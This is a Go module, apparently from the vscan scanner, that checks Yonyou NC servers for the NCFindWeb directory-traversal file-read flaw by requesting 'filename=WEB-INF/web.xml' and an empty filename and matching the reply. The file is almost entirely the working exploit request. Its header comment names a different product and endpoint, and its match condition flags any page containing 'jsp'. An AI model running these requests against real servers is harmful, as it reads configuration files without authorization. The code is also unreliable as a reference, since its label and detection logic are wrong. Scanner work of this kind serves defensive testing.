package yonyou

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)
//用友 FE协作办公平台 templateOfTaohong_manager.jsp 目录遍历漏洞


func NCFindWeb(u string) bool {
	vulnurl := []string{"/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml", "/NCFindWeb?service=IPreAlertConfigService&filename="}
	var vuln = false
	for _, vulnurl := range vulnurl {
		if req, err := pkg.HttpRequset(u+vulnurl, "GET", "", false, nil); err == nil {
			if req.StatusCode == 200 && strings.Contains(req.Body, "<servlet-name>NCInvokerServlet</servlet-name>") || strings.Contains(req.Body, "jsp") {
				pkg.GoPocLog(fmt.Sprintf("Found vuln yonyou NCFindWeb|%s\n", u+vulnurl))
				return true
			}
		}
	}
	return vuln

	// if req, err := pkg.HttpRequset(u+"/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml", "GET", "", false, nil); err == nil {
	// 	if req.StatusCode == 200 && strings.Contains(req.Body, "<servlet-name>NCInvokerServlet</servlet-name>") {
	// 		pkg.GoPocLog(fmt.Sprintf("Found vuln yonyou NCFindWeb|%s\n", u+"/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml"))
	// 		return true
	// 	}
	// }
	// if req, err := pkg.HttpRequset(u+"/NCFindWeb?service=IPreAlertConfigService&filename=", "GET", "", false, nil); err == nil {
	// 	if req.StatusCode == 200 && strings.Contains(req.Body, ".jsp") {
	// 		pkg.GoPocLog(fmt.Sprintf("Found vuln yonyou NCFindWeb|%s\n", u+"/NCFindWeb?service=IPreAlertConfigService&filename="))
	// 		return true
	// 	}
	// }
	// return false
}